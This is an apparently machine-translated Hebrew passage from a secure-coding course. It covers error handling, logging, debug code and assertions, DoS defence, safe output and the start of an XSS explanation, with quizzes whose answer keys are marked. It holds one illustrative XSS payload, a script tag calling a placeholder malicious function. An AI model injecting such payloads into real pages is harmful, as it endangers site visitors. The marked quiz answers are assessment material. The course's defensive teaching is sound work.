ברוב שפות התכנות עדיף לעתים קרובות להשתמש במנגנון אחר (כמו טיפול בחריגים) במקום זאת בעת יצירת הממשק, מכיוון שקודים חוזרים כל כך בקלות מובילים לטעויות לאורך זמן. זה לא מעשי ב-C נייד, מכיוון של-C אין מנגנונים רבים אחרים (למשל, ל-C אין מנגנון סטנדרטי לטיפול בחריגים). לכן, אם אתה משתמש ב- C, שקול להעביר את הטיפול בשגיאות לסוף הפונקציה. פעולה זו מפרידה בין הטיפול בשגיאות לבין הלוגיקה הפונקציונלית ומפשטת את העברת המשאבים הנכונה. הסבר טוב לגישה זו נמצא במדריך [סגנון קידוד ליבת לינוקס](https://www.kernel.org/doc/Documentation/process/coding-style.rst).

כאשר אתה משתמש בממשק המשתמש בקודי החזרה, הקפד לבדוק בכל פעם שיש קוד החזרה אם כשל עלול להוביל לפגיעות. לדוגמה, כ-35 מיליארד מכשירי אינטרנט של הדברים (IoT) נמצאו בשנת 2021 כבעלי פגיעויות אבטחה הרסניות עקב יצירת מספרים אקראיים קריפטוגרפיים לא מספקים. זאת בין השאר משום שמפתחי תוכנה רבים של IoT קראו ישירות למחוללי מספרים אקראיים בחומרה (הם לא אמורים לעשות זאת), אך גרוע מכך, הם התעלמו מקודי החזרת שגיאות מאותם גנרטורים (והם בהחלט לא צריכים לעשות זאת). לקבלת פרטים נוספים על דוגמה זו, ראה [אתה עושה IoT RNG](https://labs.bishopfox.com/tech-blog/youre-doing-iot-rng) ([מצגת](https://www.youtube.com/watch?v=Zuqw0-jZh9Y)) מאת דן פטרו ואלן ססיל, מצגת DEF CON 2021. נדון ביצירת מספרים אקראיים קריפטוגרפיים בפירוט רב יותר בהמשך.

#### חריגים

לרוב שפות התכנות יש *מנגנון טיפול בחריגים* (אם כי יש, אה, יוצאים מן הכלל!). זה כולל שפות מגוונות כמו Java, C#, Python, PHP (5+), Perl, Ruby, Tcl, JavaScript, C++, Ada, Smalltalk, Common Lisp, Scheme (6+), Erlang ו-OCaml. במערכות כאלה, אתה יכול "לזרוק" או "להעלות" חריגה כאשר מזוהה שגיאה, ואתה יכול "לתפוס" או "להציל" חריג כדי לטפל בו; הערימה מתפרקת שוב ושוב כאשר נזרקת חריגה עד שיש תפיסה תואמת. שפות רבות מגדירות אזורים לתפוס (לדוגמה, "נסה").

אם אתה מיישם  את הרמה *העליונה* של תוכנית או מסגרת (למשל, לולאת האירועים העיקרית שלה), אתה בדרך כלל רוצה לתפוס את כל החריגים (עם אולי כמה, אה, חריגים). רשום את החריגה (עם כמה פרטים, למעט מידע כמו סיסמאות שאולי יש להשמיט מהיומן). ודא שלאחר השלמת הבקשה או האירוע, כולל בעת עיבוד חריג, כל המשאבים הוחזרו אם הם אמורים להיות. לבסוף, חזור על לולאת האירוע כדי לעבד את האירוע הבא. רישום יכול לסייע באיתור באגים ובזיהוי חדירות. זה בסדר לומר למבקש כי "היתה בעיה" תוך אי מסירת פרטים רבים; בשביל זה נועד היומן הפנימי.

אחרת, אתה בדרך כלל צריך להיות ספציפי לגבי החריגים שאתה תופס, ולתפוס חריג רק אם אתה יכול לעשות משהו מתאים בקשר לזה. תוקפים ינסו להפעיל חריגים, לכן ודא שהמטפלים בחריגים מאובטחים.

#### גישות אחרות לטיפול בשגיאות

ישנן גישות אחרות לטיפול בשגיאות.

שפות תיכנות מסוימות משתמשות בבוני כתב המספקים ערך החזרה המבחין בין ערכים רגילים לערכי שגיאה. דוגמה טובה לכך היא "אולי" של האסקל****, המוגדר כ"**נתונים אולי a = שום דבר | רק א**". משמעות הדבר היא כי ** ערך אולי** חייב להיות או **כלום** או **רק** ערך. גישה זו דומה להחזרת שגיאות, אך מכיוון שמערכת הכתב מבחינה בין ערך לשגיאות (שאינן ערכים), אין באפשרותך להתעלם בטעות משגיאות; אתה צריך לחלץ את הערך כדי לקבל תוצאה. שפות תכנות מסוימות מספקות גם מבנים לביצוע חילוץ זה בקלות ומפיצים את השגיאה באופן אחר, למשל, [האופרטור "?" ב- Rust ](https://doc.rust-lang.org/book/ch09-02-recoverable-errors-with-result.html) ושרשור [אופציונלי ב- Swift](https://docs.swift.org/swift-book/LanguageGuide/OptionalChaining.html). כמובן, אתה יכול בכוונה לכתוב קוד כדי לדלג על ערך השגיאה (למשל, **כלום**); היזהר מלעשות זאת אם עלולה להיות לכך השפעה על האבטחה.

שפות מסוימות מאפשרות החזרות מרובות ערכים ומשתמשות בהן לטיפול בשגיאות. לדוגמה, מוסכמות השגיאה של Go עושות זאת. פונקציות יכולות להחזיר ערכים מרובים, ואחד מהם יכול להיות ערך שגיאה. פעולה זו מונעת את הסיכונים של העמסת יתר על ערכים בהשוואה לערכי החזרה מסורתיים. עם זאת, בדומה לערכי החזרה, קיים סיכון שתשכח לבדוק את ערך החזרת השגיאה הנפרד. לפרטים נוספים, עיין [*בבלוג Go: טיפול בשגיאות ו- Go*](https://blog.golang.org/error-handling-and-go) (2011), מאת אנדרו ג'רנד.

#### סיכום טיפול בשגיאות

טיפול בשגיאות הוא עובדת חיים, אך עליך לוודא שהטיפול בשגיאות שלך (ולא רק הקו "הראשי" שלך) מאובטח. קל לשכוח לזהות או לטפל בשגיאות. היכן שאתה יכול, נסה להשתמש בגישות שסביר יותר שיפעלו כראוי *גם* כאשר התוכנית משתנה על ידי אחרים.

#### חידון 3.6: טיפול בשגיאות

\>\>בחר את כל המשפטים האמיתיים.<<

[!x] בעיה נפוצה עם קודי החזרה מסורתיים היא שקל לשכוח לבדוק את השגיאה.

[ ] עליך לתפוס את כל החריגים שהועלו על ידי השיטות / הפונקציות שאתה קורא להן. {{ נבחר: לא, אתה צריך לתפוס חריג רק אם אתה יודע מה תעשה עם זה. }}

[x] אם חריגה מועלית עד ל"פסגה" של תוכנית (לדוגמה, לולאת האירועים שלה), עליך בדרך כלל לרשום חריגה זו ולאחר מכן להחליט אם התוכנית תיעצר או תמשיך.

### רישום

הדרך הטובה ביותר להתמודד עם התקפות היא למנוע מהן השפעה כלשהי. למרבה הצער, כפי שציינו קודם לכן, לפעמים התוקפים עוברים את אמצעי המניעה שלנו. במקרים אלה, עלינו לזהות את ההתקפה ואז להתאושש ממנה. זיהוי הוא חיוני, מכיוון שלעתים קרובות לא נדע להפעיל את השחזור עד שנזהה בעיה.

מנגנון מפתח המאפשר זיהוי הוא מעין מערכת רישום. לאחר מכן ניתן לנטר את היומנים, יחד עם אינדיקטורים אחרים, כדי לזהות התקפות מתמשכות. בפועל, יומנים מיישומים שונים נשלחים לעתים קרובות ליכולת מרכזית מוגנת כלשהי כדי לפשט את הניתוח (כי כל הנתונים האלה יהיו במקום אחד) ולהגן על היסטוריית היומנים גם כאשר יישום הוא חתרני. קורס זה לא יכסה באופן ספציפי כיצד לנטר יומנים כדי לזהות התקפות מוצלחות. במקום זאת, נתמקד באופן שבו ניתן לשלוח מידע ליומנים כדי לאפשר לאחרים (תוכניות ובני אדם) לבצע זיהוי זה.

בעת בניית יישום, עליך בדרך כלל לשלוח נתונים מפורטים ליומני הרישום במקום לחשוף את פרטי הבעיה למשתמשים לא מהימנים. זה בסדר לומר שיש בעיה, אבל אל תגיד יותר מדי; התוקפים אוהבים את זה כשאתה נותן להם נתונים מפורטים על ההתקפות שלהם! יומני הרישום צריכים בדרך כלל לתעד אירועים חשובים, כולל הצלחתם או כישלונותיהם. דוגמאות לכך כוללות הצלחות התחברות, כשלים בהתחברות והתנתקויות. כלול גם כל דבר שעשוי להצביע על התקפה או ניסיון לעקוף הגנות. הקפד לספק קטגוריות שונות או רמות חשיבות שונות כדי שניתן יהיה לשלוט בכמות פרטי הרישום בזמן ריצה.

מכיוון שרישום הוא כל כך חשוב, יישומים רבים משתמשים במערכת רישום כלשהי המיושמת על ידי ספרייה או יישום חיצוניים. בדרך כלל, עליך לנסות לעשות שימוש חוזר במערכות יומן קיימות; זה פחות קוד לכתוב, קל יותר לשלב עם מערכות אחרות, וכן הלאה. אם אתה חייב ליישם מערכת משלך, עליך בדרך כלל לרשום עבור כל אירוע את התאריך / שעה (עם דיוק של תת-שנייה), המקור (מכונה ויישום), קטגוריה ופרטים על האירוע.

שוב, רישום הוא מנגנון אבטחה שיכול בעצמו להפוך לפגיעת אבטחה. אז יש לך מערכת רישום ביישום גדול יותר, אבל ליישם אותה באופן שנוגד את הפגיעויות הפוטנציאליות האלה.

נתונים עבור יומני רישום כוללים לעתים קרובות נתונים ממשתמשים לא מהימנים, ותוקפים עשויים ליצור נתונים בכוונה כדי לתקוף את מערכת הרישום או מערכות מתקדמות יותר המעבדות נתוני יומן. הם עשויים לנסות להוסיף נתונים שקרסו או ישתלטו על מערכת הרישום, לזייף ערכי יומן או ליצור התקפות על מערכת אחזור היומן. זיוף יומנים הוא בעיה נפוצה במיוחד, ואינך רוצה לבנות מערכת המאפשרת לתוקפים להפליל אחרים. כדי לפתור זאת, עליך לוודא שכל הנתונים הלא מהימנים הנשלחים ליומן יימלטו או יחוטאו כאשר הם מאוחסנים. ממשקי API רבים של רישום כבר עושים זאת - ודא שכן, ואם יש לך ברירה, העדיף מאוד להשתמש בממשקי API שעושים זאת עבורך. אם אין לך ברירה, שקול ליישם *עטיפה* כדי לקודד באופן אוטומטי ובטוח את נתוני יומן הרישום כך שהבעיה תימנע באופן אוטומטי.

להגביל מאוד את מי שיכול לקרוא את היומנים; הם בדרך כלל לא צריכים להיות קריאים על ידי כולם. עם זאת, אפילו עושה את זה לא מספיק.

ככלל, אל תכלול סיסמאות או נתונים רגישים מאוד ביומנים. מאחר שאנשים עשויים לעיין ביומנים מאוחר יותר, נתוני יומן הרישום יוצאים לעתים לאנשים רבים יותר מכפי שניתן היה לצפות. לעתים יומני רישום נחשפים לאחרים, והנמען עשוי להשתמש ביומני הרישום בדרכים לא מורשות. היזהר מהכללת נתונים אם הם עשויים לכלול סיסמאות או מפתחות פרטיים! אם עליך לכלול נתונים שעשויים להיות רגישים, שקול לרשום את הנתונים כערך מוצפן או מגובב באופן קריפטוגרפי, כך שאנשים שמקבלים את היומן לא יוכלו להשתמש בו בקלות באופן לא מורשה.

 *כשלי רישום וניטור אבטחה* הוא 2021 OWASP Top 10 #9. * רישום וניטור לא* מספיקים הוא 2017 OWASP Top 10 #10. * הכללת מידע רגיש בקבצי יומן*, [CWE-532](https://cwe.mitre.org/data/definitions/532.html), היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #39 ו- 2019 CWE Top 25 #35.

#### חידון 3.7: רישום

\>\>בחר את כל המשפטים האמיתיים.<<

[!] באופן כללי, מידע רשום צריך להיות מוצג גם למשתמש שהפעיל אותו כדי להאיץ את איתור הבאגים {{ נבחר: בהחלט לא; היומנים עשויים להכיל מידע רגיש או סודי, ומשתמשים לעתים קרובות אינם מהימנים לחלוטין. במקום זאת, דווח למשתמש על מה שהמשתמש צריך לדעת (למשל, "הפעולה לא עבדה"... ולשים את הפרטים ביומנים. }}

[ ] רישום הוא לעתים קרובות מיותר כי עדיף לפתח מערכת שאינה פגיעה מלכתחילה. {{ נבחר: זה נהדר לפתח מערכת ללא פגיעויות. מכיוון שאין דרך להיות בטוחים לחלוטין שזה נכון, אנו זקוקים לרישום כדי לאפשר זיהוי של בעיה, כך שנוכל להגיב לבעיה. }}

[x] יומנים צריכים בדרך כלל לכלול הרבה יותר פרטים, אך היזהרו מלכלול סיסמאות ומפתחות פרטיים, מכיוון שיומני רישום גלויים לפעמים לרבים אחרים. אם עליך לכלול נתונים אלה, שקול לכלול אותם כערך מוצפן או מגובב באופן קריפטוגרפי.

[x] ייתכן שמערכת יומן הרישום שלך תצטרך לתעד נתונים של תוקף, לכן ודא שמערכת הרישום שלך אינה חשופה להתקפת "זיוף יומן" (שבה תוקף מספק נתונים שגורמים ליומן המוקלט להטעות בדרך כלשהי).

### קוד איתור באגים וקביעה

לפעמים פגיעויות נובעות מאיתור באגים וקוד קביעה; בואו נדבר על זה.

#### קוד איתור באגים

מפתחים לעתים קרובות להכניס קוד אך ורק כדי לקבל נראות של מה שקורה. לדוגמה, בעת איתור באגים, הם עשויים להוסיף משפטי הדפסה. הם עשויים גם לעשות זאת כדי לפשט את הבדיקות או פשוט כדי להשיג הבנה. כשלעצמו, זה בסדר, אבל יש סיכון להשאיר את קוד הבאגים הזה מופעל בייצור. אלה נוטים הרבה יותר להוביל פגמים ופגיעויות אבטחה, שכן הם לא נועדו להיות שם בתוכנה ששוחררה.

אז אם אתה מוסיף קוד איתור באגים, הפרד אותו איכשהו כך שיהיה *קל* להסיר אותו באופן אוטומטי. זה לא משנה איך; מוסכמות מתן שמות, דגלי מהדר וכן הלאה, כולם יכולים לעבוד, כל עוד קל לעשות את  הדבר *הנכון*.

אסטרטגיה טובה לטווח ארוך היא להפעיל מערכת רישום בשלב מוקדם, ולהשתמש בה או להפוך את הצהרות איתור הבאגים שלך להצהרות רישום. אם אתה מוצא את זה שימושי לראות מידע עכשיו, זה עשוי להיות שימושי כדי לראות את זה מאוחר יותר. זה גם אומר שבמקום הצורך להסיר את קוד איתור הבאגים, תוכל להפעיל אותו בקלות מאוחר יותר, אפילו בתוך מערכת ייצור. קוד רישום זה חייב להתנגד להתקפה, בדיוק כמו שאר הקוד.

#### קביעות

בשפות רבות יש הצהרות או ביטויים "טוענים" כדי לומר משהו שאמור ** להיות תמיד נכון בזמן ריצה. אלה יכולים להיות שימושיים לבדיקת שפיות של תוכנית בזמן שהיא פועלת. דוגמאות לכך כוללות את  הצהרת **הטענה** של Java, משפט ההטענה של  Python, **המאקרו** assert() של  C/C++/Rust  ושיטת **ה-assert()**** של JavaScript Node.js ** . ברוב השפות, אם הטענה נכשלת בזמן ריצה, אז נזרק חריג.

קביעות הן לעתים קרובות נהדרות, מכיוון שהן יכולות לעצור בעיות לפני שהן נעשות חמורות יותר. עם זאת, אם תוקף יכול לגרום לכשל בהצהרה, הדבר עלול להוביל ליציאת יישום או להתנהגות אחרת חמורה מהנדרש. בפרט, כאשר מעשית:

* הימנע ממתן אפשרות לתוקף להפעיל טענה. בפרט, *לעולם אל* תשתמש בקביעות לאימות קלט של קלט לא מהימן. יש לפחות שתי סיבות טובות:

    1. התמודדות עם קלט התוקף היא * התנהגות צפויה!*

    2. לעתים קרובות ניתן להשבית קביעות באמצעות דגלי מהדר או זמן ריצה. זה מפר את העיקרון של אימות קלט שאינו ניתן לעקוף עבור אבטחה, מכיוון שגישת אופטימיזציה סבירה לחלוטין יכולה להשבית בטעות צורך אבטחה חיוני.

* הגבל את היקף תגובת הקביעה (מטפל בחריגים) להפעלה של התוקף היכן שניתן. לדוגמה, נסה לקרוס רק את החיבור הזה, לא את כל החיבורים, אם טענה נכשלת.

 *קביעה ניתנת להשגה* (טענה שתוקף יכול להפעיל), [CWE-617](https://cwe.mitre.org/data/definitions/617.html), היא סיבה נפוצה כל כך לפגיעויות אבטחה שהיא 2019 CWE Top 25 #40.

הוספת קביעות יכולה להפוך טכניקת אימות בשם "fuzzing" ליעילה יותר. לכן, זה לעתים קרובות רעיון טוב יש טענות רבות, כל עוד הם ביטויים כי בהחלט *צריך* להיות אמיתי. נדון בערפול ביתר פירוט בהמשך.

#### חידון 3.8: קוד איתור באגים וקביעה

\>\>בחר את כל המשפטים האמיתיים.<<

[!x] אם תוסיף קוד לאיתור באגים, תוכל להסיר אותו באופן אוטומטי או להפוך אותו להצהרת רישום.

[ ] השתמש בקביעה כדי לקבוע אם קלט לא מהימן עומד בקריטריוני הקלט.

[x] קביעות יכולות להפוך טכניקות אימות אחרות ליעילות יותר.

### מאבק בהתקפות מניעת שירות (DoS)

מערכות מאובטחות צריכות להיות זמינות למשתמשים מורשים גם כאשר הם נמצאים תחת מתקפה. זה קשה במיוחד אם ניתן לגשת למערכת שלך דרך האינטרנט הציבורי. תוקפים עשויים להיות מסוגלים להפעיל מתקפת DoS מבוזרת (DDoS) ממערכות רבות שהם שולטים בהן, וליצור מיליוני או מיליארדי בקשות. אם לתוקף יש משאבים רבים, ייתכן שלא תוכל להתמודד עם ההתקפה *אלא* על-ידי שימוש במשאבים משמעותיים (כולל כסף) כדי לטפל בעומס העבודה.

גישה אחת היא לתכנן את המערכת שלך כך שתוכל להתמודד עם כמויות גדולות יותר של תנועה. בדרך זו, בקשות התוקף פשוט יטופלו. תכנון המערכת את המערכת שלך להיות ניתנת להרחבה (למשל, באמצעות קונטיינריזציה) ולפרוס אותה במערכת ענן שבה תוכל להגדיל באופן אוטומטי (או לפחות במהירות) לגדלים גדולים בהרבה אם יש ביקוש. השתמש במטמונים, ברשתות אספקת תוכן (CDN) וצמצם את זמן הביצוע לכל בקשה, כך שניתן יהיה לטפל בבקשות רבות יותר בכל שנייה. שקול להשתמש באתר סטטי שבו סוג זה של אתר אינטרנט הוא אפשרות מעשית. ישנן דרכים רבות למזער את זמן הביצוע (aka להגדיל את הביצועים); עבור מערכות רבות, שימוש מרבי באינדקסים של מסדי נתונים וביטול שאילתות "N+1" הוא צעד ראשון טוב.

עם זאת, בשלב מסוים תוקף השולט במספיק משאבים יוכל להציף את רוב השירותים, אלא אם כן אתה מוכן להוציא סכום כסף גדול כדי לטפל בהם. אז גישה אחרת היא להתאושש במהירות מהביקוש המופרז שנגרם על ידי התוקפים. ודא שההפעלה מחדש יכולה להיות אוטומטית ושהמערכת שלך יכולה לבצע הפעלה מחדש במהירות יחסית. כאשר זה הגיוני, יש מצב "backoff" (למשל, מצב לקריאה בלבד או שירות נפרד) כך שחלק ** מהשירותים יהיו זמינים במהלך התקפה אגרסיבית.

דרך נוספת להקשות על התקפות DoS היא להפחית את כמות המשאבים שהיישום שלך דורש. אם משאבים נדרשים באופן זמני (לדוגמה, נקודות אחיזה לקבצים וכו'), ודא שההקצאה והצריכה שלהם מבוקרות ושהם מוחזרים כאשר אין בהם עוד צורך. בנוסף, להימנע "איבוד" משאבים. זיכרון הוא משאב המנוהל באופן אוטומטי על-ידי שפות רבות, אך משאבים רבים אחרים אינם או הולכים לאיבוד בקלות. אם עליך להחזיר משאב באופן ידני בשפה עם טיפול בחריגים, ודא שהמשאבים מוחזרים *גם* כאשר נזרקת חריגה.

 ישנם מספר סוגים של פגיעויות (קשורות) לטיפול במשאבים, וכל אחת מהן עלולה להוביל בסופו של דבר למניעת שירות. מה עוד, הם בעיות נפוצות:

* *צריכת משאבים בלתי מבוקרת* ([CWE-400](https://cwe.mitre.org/data/definitions/400.html)) היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #27 ו- 2019 CWE Top 25 #20.

* זה קשור מאוד לשחרור חסר של משאבים, 2019 CWE Top 25 #21, [CWE-772](https://cwe.mitre.org/data/definitions/772.html), *שחרור חסר של משאב לאחר חיים אפקטיביים*.

* *הקצאת משאבים ללא מגבלות או ויסות* ([CWE-770](https://cwe.mitre.org/data/definitions/770.html)) היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #40 ו- 2019 CWE Top 25 #39.

בעיה ברורה אך נפוצה באופן מפתיע היא לולאות שבהן תוקף יכול לגרום למצב היציאה לעולם לא להתרחש, מה שגורם לתוכנית להיתקע בלולאה אינסופית מבלי לבצע עבודה.

 לולאות עם תנאי יציאה בלתי נגישים הן 2019 CWE Top 25 #26, [CWE-835](https://cwe.mitre.org/data/definitions/835.html).

ודא שיש לך גיבויים של ערכות נתונים חשובות ותהליך שחזור מעשי. בדרך זו, אם תוקף מצליח לכבות את המערכת כולה, אובדן הנתונים ימוזער. במידת הצורך, תוכל אפילו להפעיל מחדש את השירות במקום אחר או בצורה אחרת באמצעות הגיבויים. אמורים להיות לך גיבויים מרובים, ולפחות כמה ישנים יותר צריכים להיות באחסון *קר* (כלומר, לא ניתן לשנות את הגיבויים על ידי התקפת מחשב מאוחרת יותר). באופן זה, אם גיבויים חדשים יותר נפגמים על-ידי תוקף (למשל באמצעות מתקפת כופר), עדיין ניתן להשתמש בגיבויים.

#### חידון 3.9: מאבק בהתקפות מניעת שירות (DoS)

\>\>בחר את כל הגישות שעשויות לסייע נגד התקפות מניעת שירות (DoS) אם השירות שלך נגיש באינטרנט הציבורי:<<

[!x] צמצם את זמן הביצוע לכל בקשה.

[x] השתמש ברשת אספקת תוכן (CDN).

[x] למנוע את אובדן המשאבים הנדרשים על ידי המערכת.

[x] צמצם את הזמן הדרוש להפעלה מחדש של המערכת.

[ ] אף אחד מהנ"ל

# שליחת פלט

פרק זה מתאר כיצד לשלוח פלט באופן מאובטח, כולל כיצד להתמודד עם התקפות סקריפטים חוצי אתרים (XSS), שימוש בכותרות הקשחת HTTP ושימוש מאובטח במערכות עיצוב.

מטרות הלמידה:

1. דונו כיצד לשלוח פלט בצורה מאובטחת.

2. הסבר כיצד להתמודד עם התקפות Scripting חוצות אתרים (XSS).

3. השתמש בכותרות הקשחה של HTTP, כולל מדיניות אבטחת תוכן (CSP).

4. הסבר כיצד למנוע פגיעויות נפוצות אחרות הקשורות לפלט ביישומי אינטרנט.

5. הבן כיצד להשתמש באופן מאובטח במחרוזות עיצוב ובתבניות.

6. הבן כיצד לטפל בפגיעויות נפוצות אחרות הקשורות לפלט.

### מבוא לשליחת פלט

בסופו של דבר, תוכניות צריכות לשלוח פלט איפשהו. זה יכול להיות תשובה לבקשה, תצוגה למשתמש, אחסון מידע במסד נתונים או כל דבר אחר שמחזיר תוצאה.

כל מה שלמדנו על שליחת מידע לתוכניות אחרות חל גם כאן. לדוגמה, לעתים קרובות יהיה עליך לחטא, לברוח ו/או לנרמל את הפלט שאתה שולח בחזרה למשתמש כלשהו.

כלל אצבע מהיר הוא שעליך לנסות למזער את המידע שהתוכנית שלך מציגה למשתמש לא מהימן, במיוחד אם הוא קשור לאבטחה:

* אם התוכנית שלך דורשת אימות משתמש כלשהו (כגון רבים עם חיבור רשת), תן למשתמש מידע מועט ככל האפשר לפני האימות. בפרט, הימנע ממסירת מספר הגירסה של התוכנית שלך לפני האימות, אלא אם כן זה קל למצוא בכל מקרה או שזה המופע היחיד של התוכנית. אחרת, אם גירסה מסוימת של התוכנית שלך מתגלה כבעלת פגיעות, משתמשים שאינם משדרגים מגירסה זו מפרסמים לתוקפים שהם פגיעים.

* אם כניסה נכשלת, שים לב שהיא נכשלה, אך באופן כללי אל תגיד מדוע. לדוגמה, אל תגיד ששם המשתמש שגוי, אלא אם כן התוקף יכול לקבל שמות משתמש בכל מקרה כמידע ציבורי. לעולם אל תגיד שסיסמה היא "כמעט" נכונה; זה נכון או שזה לא.

* אל תציג סיסמאות על המסך כברירת מחדל. לדוגמה, ב- HTML, השתמש בסוג הנתונים "סיסמה", מכיוון שבדרך כלל זה מחליף כל תו סיסמה בנקודה. אחרת, תוקף שגולש מאחורי המשתמש עלול לקבל את המידע הזה, או שהמידע עלול להיחשף בטעות על ידי משתמש שיוצר סרטון.

* אם עליך להציג מידע רגיש כלשהו בטופס, הפוך אותו לעמוד נפרד או ללחצן שיכול להסתיר/לחשוף מידע זה. נסו להפוך את הסתרת המידע הרגיש לברירת המחדל. שוב, זה עוזר להתמודד עם גלישת כתפיים וגילוי מקרי של מידע.

* מזער הערות קוד מוטבעות הנשלחות למשתמשים; פעולה זו מבזבזת תעבורת רשת ועלולה לחשוף בטעות מידע. אם אתה משתמש ב- JavaScript, מיניפיקציה יכולה לסייע במניעת זאת.

התוכנית שלך צריכה להיות מוכנה גם לטפל בתוקפים שדוחים בכוונה או מקבלים לאט מאוד את התפוקה. אחרת, ייתכן שתוקף יוכל לגרום לתוכנית שלך להפסיק להגיב למשתמשים אחרים, פשוט על-ידי סתימת פלט מסוים. יישומים המשתמשים בתקשורת אסינכרונית הם בדרך כלל הרבה פחות פגיעים לכך, אבל כל יישום *יכול* להיות בעיה זו. בעיקרון, ודא שתוקף אינו יכול לסתום מערכת על-ידי עצירה או האטה של דפדפן האינטרנט שלו, חיבור TCP/IP איטי בכוונה וכן הלאה. בקיצור, אל תיצור הזדמנות קלה להתקפת מניעת שירות. הנה כמה טיפים:

* שחרור נעילה במהירות, רצוי לפני מענה עם  פלט *כלשהו*.

* השתמש בפסקי זמן בכתיבה מונחית רשת.

* מדוד את הזמן מתחילת הניסיון שלך - זה בסדר לעצור באמצע אם הוא איטי באופן חשוד.

עליך לעקוב אחר המוסכמות הקבועות של המערכת שבה אתה משתמש במידת האפשר, שכן לעתים קרובות רכיבים אחרים תלויים בכך. בפרט, באינטרנט,  שיטות **GET** ו**- HEAD** של HTTP לא צריך לנקוט כל פעולה קבועה בעצמם; הם צריכים להיות רק אחזור מידע.  שיטת **GET**,  בפרט, יכולה להיגרם על ידי לחיצה פשוטה על היפר-קישור בדף סטטי, ואינה צריכה לכלול שום דבר קבוע כמו קנייה או מכירה. במקום זאת, השתמש בשיטות אחרות (כגון **POST,** **PUT** ו**- DELETE)** כדי לציין שינויים קבועים. פרוטוקול HTTP אינו יכול לאכוף זאת, אך זוהי המוסכמה הסטנדרטית, וכלים רבים מניחים זאת, ולכן עליך ליישם כלל זה גם כאשר הוא מעשי.

הקפד לומר למקלט בדיוק כיצד לפרש את הפלט. אחרת, אם הוא כולל נתונים של תוקף, התוקף עלול להיות מסוגל להטעות את הנמען לפרש אותם בדרך הלא נכונה. זוהי בעיה נפוצה במיוחד ביישומי אינטרנט:

* ציין בבירור את סוג ה- MIME של הנתונים הנשלחים. דפדפנים יכולים לנחש, אבל הם עשויים לנחש לא נכון.

* ציין בבירור את קידוד התווים של הפלט שנשלח. אל תגרום לתוכנית המקבלת לנחש את קידוד התווים! אם התוכנית המקבלת (בדרך כלל דפדפן האינטרנט) צריכה לנחש, התוקף עלול להטעות את המערכת שלך לשלוח חומר שמוביל לניחוש שגוי ובסופו של דבר להתקפה. אם אתה שולח HTML, בדרך כלל עליך לומר לנמען שהוא UTF-8. הדרך הטובה ביותר לעשות זאת היא באמצעות  האפשרות **HTTP charset**, אשר לעתים קרובות אתה יכול לעשות עם אפשרות תצורה פשוטה. אם אינך יכול לשלוט בכך מסיבה כלשהי, כלול מידע זה ב- HTML **<head> , **למשל, **<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> **.

באופן כללי יותר, לעתים קרובות עליך **_לברוח מהפלט שלך_** כך שכל הנתונים שאתה מייצר שעשויים להיות מושפעים מהתוקף לא יוכלו להפוך להתקפה. זוהי בעיה נפוצה במיוחד ביישומי אינטרנט. אחת הפגיעויות הנפוצות ביותר ביישומי אינטרנט נקראת *סקריפטים חוצי אתרים* (XSS). בעיה זו היא על כל לא לשלוח פלט כראוי, ובמיוחד, על בריחה פלט כראוי. היחידה הבאה תסביר את הפגיעות וכיצד להתמודד איתה.

#### חידון 4.1: מבוא לשליחת פלט

\>\>אל תבזבז מקום לספר לדפדפן אינטרנט מקבל את סוג הנתונים או הקידוד הנשלחים, מכיוון שדפדפנים עושים עבודה מצוינת בקביעה אוטומטית של מידע זה. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

זה לא נכון. דפדפני אינטרנט עושים עבודה מצוינת בקביעה אוטומטית של מידע זה כאשר אין התקפה, אך תוקפים יכולים להיות ערמומיים מאוד באספקת נתונים שתוכננו במיוחד כדי להטעות את היוריסטיקות של התוכניות. במקום זאת, כאשר קיימות אפשרויות, עליך לשלוח מידע לנמענים כדי לומר להם בדיוק כיצד לפרש את הנתונים, כגון סוג הנתונים והקידוד שלהם.

[הסבר]

### התמודדות עם סקריפטים חוצי אתרים (XSS)

[יישום אינטרנט]

#### בעיית XSS

אחת הפגיעויות הנפוצות ביותר ביישומי אינטרנט היא פגיעות של סקריפטים מרובי אתרים (XSS). בהתקפת XSS, התוקף מנסה להטעות דפדפן אינטרנט לעשות משהו זדוני (בדרך כלל כדי להפעיל קוד זדוני) על-ידי הוספת מידע לדף אינטרנט או יישום אינטרנט חוקי שיתפרש באופן שגוי על-ידי הדפדפן המקבל כפעולה זדונית כלשהי. זה תמיד מקוצר כמו XSS, כי CSS כבר יש משמעות אחרת (גיליונות סגנונות מדורגים). XSS היא בעיה נפוצה במיוחד בדפים או באתרים המאפשרים הערות משתמש, מכיוון שתגובות משתמשים הן וקטור קל לתוקפים להוסיף את המידע הזדוני שלהם.

הבעיה הבסיסית היא שדפדפני אינטרנט (הפועלים כלקוחות) חייבים להניח שאם הם נשלחו נתונים מסוימים, השולח התכוון לשלוח אותם. אחרי הכל, מה עוד יכול דפדפן האינטרנט להניח? עם זאת, אם השולח יוצר נתונים אלה על-ידי שילוב נתונים קבועים שהוא שולט בהם עם נתונים שסופקו על-ידי התוקף, והנתונים שסופקו על-ידי התוקף אינם מחוטאים כראוי, השילוב עלול להפוך לזדוני. השילוב הזה יתפרש אז על ידי דפדפן האינטרנט כבקשה לעשות משהו זדוני, מה שהוא עושה לאחר מכן.

לדוגמה, אם שרת האינטרנט שולח HTML מוטבע עם מחרוזת ממשתמש לא מהימן, והתוקף מסדר שמחרוזת זו תכיל **<script> do_something_malicious();  </script>**המשתמש עלול בסופו של דבר להפעיל את תוכנית JavaScript **do_something_malicious()**.,

ב- XSS, המערכת שבסופו של דבר מותקפת היא *דפדפן האינטרנט*. עם זאת, *הגורם* להתקפה הוא קוד לא תקין שנכתב בשולח ** הנתונים לדפדפן האינטרנט. ישנן שלוש תבניות נפוצות עבור XSS:

* **אחסון מתמיד**<br>הנתונים הזדוניים מאוחסנים במסד נתונים לצורך אחזור במועד מאוחר יותר. לדוגמה, תוקף שולח תגובה עם סקריפט זדוני מוטבע; כאשר מישהו אחר משתמש בדפדפן האינטרנט שלו כדי להציג את ההערות, דפדפן האינטרנט מפעיל את הסקריפט הזדוני.

* **השתקפות**<br>הנתונים הזדוניים נשלחים על ידי דפדפן האינטרנט של הקורבן לשרת (בדרך כלל בתוך כתובת URL) ומשתקפים מיד בחזרה לדפדפן.

